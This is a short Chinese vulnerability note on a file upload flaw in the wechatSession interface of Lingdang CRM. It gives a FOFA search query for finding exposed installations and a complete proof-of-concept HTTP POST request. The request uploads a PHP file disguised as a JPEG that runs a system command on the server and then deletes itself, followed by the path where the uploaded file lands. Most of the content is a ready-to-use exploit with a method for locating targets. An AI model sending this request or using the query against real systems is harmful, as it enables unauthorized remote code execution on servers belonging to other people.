# 灵当CRM系统接口wechatSession文件上传漏洞

灵当CRM系统接口wechatSession文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

## poc

```javascript
POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="2.php"
Content-Type: image/jpeg

<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

![image-20241018155224218](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181552292.png)

文件路径`/crm/storage/wechatsession/2024/10/14/2.php`